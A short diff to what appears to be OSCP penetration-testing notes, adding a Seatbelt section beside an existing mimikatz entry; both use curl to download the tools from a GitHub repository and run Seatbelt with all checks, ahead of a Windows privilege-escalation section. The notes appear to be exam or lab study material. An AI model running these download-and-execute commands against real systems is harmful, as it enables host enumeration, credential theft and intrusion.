@@ -219,6 +219,14 @@ curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimika
 ```
 aaa
 ```
+# SEATBELT(https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/seatbelt)
+## TECHNIQUES
+##### SEATBELT - DOWNLOAD E EXECUTE ZIP VIA POWERSHELL
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Seatbelt.exe -Outfile Seatbelt.exe
+Seatbelt.exe -group=all
+.\Seatbelt.exe -group=all
+```
 # PRIVILEGE ESCALATION WINDOWS
 ## TECHNIQUES
 ##### ALWAYS ELEVATED(1)
